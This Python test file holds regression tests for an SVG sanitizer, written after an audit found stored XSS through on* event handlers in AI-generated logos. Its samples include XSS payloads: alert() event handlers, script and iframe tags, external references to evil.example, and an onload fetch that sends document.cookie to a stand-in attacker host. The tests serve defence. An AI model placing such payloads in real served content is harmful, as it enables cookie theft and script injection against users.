# Regression tests for the security audit's UPLOAD-3 finding:
#
# persist_recraft_logo_assets() (main.py) downloads a Recraft-generated SVG
# and, before rendering/persisting it, ran it through a sanitizer that
# stripped <script>/<foreignObject>/<iframe>/<object>/<embed> tags and
# unsafe href/src/url() external references - but never stripped
# event-handler attributes (onload, onclick, onerror, ...). Since the
# sanitized SVG is later served back to users as a stored asset
# (image/svg+xml), a browser that renders it directly would execute any
# event-handler attribute left in the markup - stored XSS via an
# AI-generated logo.
#
# Fix: the attribute-scrubbing loop (now extracted into the standalone,
# testable sanitize_recraft_svg_xml() for exactly this purpose) strips any
# attribute whose local name starts with "on", case-insensitively, before
# the existing href/src/url() checks ever see it - regardless of a
# namespace prefix or odd casing - while leaving <script>/<foreignObject>/
# <iframe>/<object>/<embed> removal and the href/src/url() external
# reference checks intact, and leaving ordinary SVG attributes untouched.
import pytest

import main

sanitize = main.sanitize_recraft_svg_xml


def _tag(element):
    return str(element.tag).split("}")[-1]


def _serialize(root):
    from xml.etree import ElementTree
    return ElementTree.tostring(root, encoding="unicode")


# ---------------------------------------------------------------------------
# Event-handler attributes: the gap this fix closes.
# ---------------------------------------------------------------------------

def test_strips_onload_attribute_on_root_svg():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" width="100" height="100"></svg>'
    root = sanitize(svg)
    assert "onload" not in root.attrib
    assert root.get("width") == "100"
    assert root.get("height") == "100"


def test_strips_onclick_and_onerror_on_nested_elements():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<rect onclick="alert(1)" x="0" y="0" width="10" height="10" fill="red"/>'
        b'<image onerror="alert(2)" href="data:image/png;base64,AAAA"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    out = _serialize(root)
    assert "onclick" not in out
    assert "onerror" not in out
    # normal, non-event attributes on the same elements survive
    assert 'fill="red"' in out
    assert 'x="0"' in out


def test_strips_event_handlers_case_insensitively():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" OnLoad="alert(1)">'
        b'<rect ONCLICK="alert(2)" OnMouseOver="alert(3)" width="5" height="5"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    out = _serialize(root)
    assert "alert(1)" not in out
    assert "alert(2)" not in out
    assert "alert(3)" not in out
    assert 'width="5"' in out


def test_strips_full_range_of_known_event_handler_names():
    handlers = [
        "onload", "onclick", "onerror", "onmouseover", "onfocus", "onblur",
        "onbegin", "onend", "onrepeat", "onactivate", "onfocusin", "onfocusout",
    ]
    attrs = " ".join(f'{name}="alert(1)"' for name in handlers)
    svg = f'<svg xmlns="http://www.w3.org/2000/svg" {attrs} width="1" height="1"></svg>'.encode()
    root = sanitize(svg)
    for name in handlers:
        assert name not in root.attrib
        assert name.upper() not in {k.upper() for k in root.attrib}
    assert root.get("width") == "1"


def test_strips_namespaced_event_handler_attribute():
    # A namespace-qualified attribute still resolves its on* local name
    # through ElementTree's "{uri}localname" form - must not bypass.
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:ev="http://www.w3.org/2001/xml-events" '
        b'ev:onload="alert(1)" width="1" height="1"></svg>'
    )
    root = sanitize(svg)
    local_names = {str(k).split("}")[-1].lower() for k in root.attrib}
    assert "onload" not in local_names


# ---------------------------------------------------------------------------
# Pre-existing protections must survive unchanged.
# ---------------------------------------------------------------------------

def test_still_strips_script_tag():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<script>alert(1)</script>"
        b'<rect width="5" height="5"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    assert not any(_tag(child) == "script" for child in root.iter())


def test_still_strips_foreignobject_iframe_object_embed():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<foreignObject><div>evil</div></foreignObject>'
        b'<iframe src="https://evil.example/"></iframe>'
        b'<object data="https://evil.example/"></object>'
        b'<embed src="https://evil.example/"/>'
        b'<rect width="5" height="5"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    remaining_tags = {_tag(child) for child in root.iter()}
    assert not remaining_tags & {"foreignObject", "iframe", "object", "embed"}
    assert "rect" in remaining_tags


def test_still_strips_unsafe_external_href():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<image xlink:href="https://evil.example/tracker.png" width="1" height="1"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    image = next(child for child in root.iter() if _tag(child) == "image")
    hrefs = [v for k, v in image.attrib.items() if str(k).split("}")[-1] == "href"]
    assert hrefs == []


def test_still_allows_safe_data_uri_href():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<image href="data:image/png;base64,AAAA" width="1" height="1"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    image = next(child for child in root.iter() if _tag(child) == "image")
    assert image.get("href") == "data:image/png;base64,AAAA"


def test_still_neutralizes_external_url_in_style_attribute():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<rect style="fill:url(https://evil.example/x.png)" width="5" height="5"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    rect = next(child for child in root.iter() if _tag(child) == "rect")
    assert "evil.example" not in rect.get("style", "")


def test_still_strips_import_in_style_element_text():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<style>@import url(https://evil.example/x.css);</style>'
        b'<rect width="5" height="5"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    style = next(child for child in root.iter() if _tag(child) == "style")
    assert "evil.example" not in (style.text or "")


# ---------------------------------------------------------------------------
# Ordinary content must stay intact.
# ---------------------------------------------------------------------------

def test_normal_svg_attributes_and_structure_are_preserved():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
        b'<circle cx="50" cy="50" r="40" fill="#336699" stroke="black" stroke-width="2"/>'
        b'<text x="10" y="90" font-family="Arial" font-size="12">SYLVEX</text>'
        b"</svg>"
    )
    root = sanitize(svg)
    assert root.get("viewBox") == "0 0 100 100"
    circle = next(child for child in root.iter() if _tag(child) == "circle")
    assert circle.get("cx") == "50"
    assert circle.get("fill") == "#336699"
    text = next(child for child in root.iter() if _tag(child) == "text")
    assert text.text == "SYLVEX"
    assert text.get("font-family") == "Arial"


def test_rejects_non_svg_document():
    with pytest.raises(ValueError):
        sanitize(b'<html><body>not an svg</body></html>')


def test_combined_attack_sample_fully_neutralized_but_stays_a_valid_logo():
    # A single malicious sample combining every vector this sanitizer must
    # defeat at once, alongside legitimate logo content that must survive.
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
        b'onload="fetch(\'https://evil.example/steal?c=\'+document.cookie)" viewBox="0 0 64 64">'
        b"<script>alert(document.cookie)</script>"
        b'<foreignObject><body onload="alert(1)"></body></foreignObject>'
        b'<rect onclick="alert(1)" x="0" y="0" width="64" height="64" fill="#111111"/>'
        b'<image xlink:href="https://evil.example/exfil.png" width="1" height="1"/>'
        b'<circle cx="32" cy="32" r="20" fill="#ffffff"/>'
        b"</svg>"
    )
    root = sanitize(svg)
    out = _serialize(root)
    assert "onload" not in out.lower()
    assert "onclick" not in out.lower()
    assert "<script" not in out.lower()
    assert "foreignobject" not in out.lower()
    assert "evil.example" not in out
    # the legitimate logo shapes remain
    assert root.get("viewBox") == "0 0 64 64"
    tags = {_tag(child) for child in root.iter()}
    assert "rect" in tags
    assert "circle" in tags
